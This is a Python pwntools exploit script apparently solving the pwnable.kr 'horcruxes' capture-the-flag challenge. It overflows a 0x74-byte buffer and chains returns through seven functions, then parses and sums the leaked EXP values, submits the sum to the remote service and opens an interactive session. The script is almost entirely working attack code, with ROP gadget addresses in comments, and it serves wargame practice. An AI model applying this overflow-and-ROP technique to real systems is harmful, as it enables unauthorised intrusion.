#!/usr/bin/env python2
from pwn import *
import re

context(os='linux', arch='i386')

binary = ELF('./horcruxes')
rop=ROP(binary)
libc = ELF('./libc.so.6')

addr_A=0x809fe4b
addr_B=0x809fe6a
addr_C=0x809fe89
addr_D=0x809fea8
addr_E=0x809fec7
addr_F=0x809fee6
addr_G=0x809ff05
diff=0x1f
addr_a=0x80a2088
addr_b=0x80a2070
addr_c=0x80a2084
addr_d=0x80a206c
addr_e=0x80a2080
addr_f=0x80a2074
addr_g=0x80a207c

addr_ropme=0x80a0009
addr_call_ropme=0x0809fffc
#enter:push ebp; mov esp -> ebp
#leave: ebp->esp; pop ebp

#buf = ebp -0x74 #116


#0x0809fc0a: add esp, 8; pop ebx; ret;
#0x080a03a5: add esp, 0xc; pop ebx; pop esi; pop edi; pop ebp; ret; 
#0x0809fdae: push 0x80a205c; call eax; 
#0x0809fde8: push 0x80a205c; call edx; 
#0x0809fe3f: push eax; call edx; 
#0x0809fdb1: or cl, byte ptr [eax]; call eax; 
#0x0809fdeb: or cl, byte ptr [eax]; call edx; 
#0x0809fdb3: call eax; 
#0x0809fded: call edx; 
#0x0809fe3c: sub esp, 0x14; push eax; call edx; 

#0x0809fe3e: adc al, 0x50; call edx; 
#0x0809fc08: add byte ptr [eax], al; add esp, 8; pop ebx; ret; 
jmp_esp_addr=0x080a065b
#mov ecx, dword ptr [ebp - 4]; leave; lea esp, [ecx - 4]; ret; 
ecx_gadget_addr=0x80a0001
pop_ebp_gadget=0x080a03ab

if __name__ == '__main__':
    sh = remote('pwnable.kr' ,9032)

    print(sh.recvuntil(b'Select Menu:', drop=False))
    sh.send('a') 
    payload = 0x74*'A' + 4*'B';
    funcs = [addr_A,addr_B,addr_C,addr_D,addr_E,addr_F,addr_G]
    for func in funcs:
        payload += p32(func)
    payload += p32(addr_call_ropme)
    
    assert('\n' not in payload)
    print(sh.recvuntil(b'How many EXP did you earned?', drop=False))
    sh.sendline(payload)

    sum_ = 0
    for i in range(7):
        print(sh.recvuntil(b'You found', drop=False))
        line = sh.recvuntil(b'\n', drop=False)
        print(line)
        exp = re.search("\(EXP \+(\-*[0-9]*)\)", line).group(1)
        print(exp)
        sum_ += int(exp)
        
    sh.send('a')
    sh.sendline(str(sum_))
    sh.interactive()

    
    
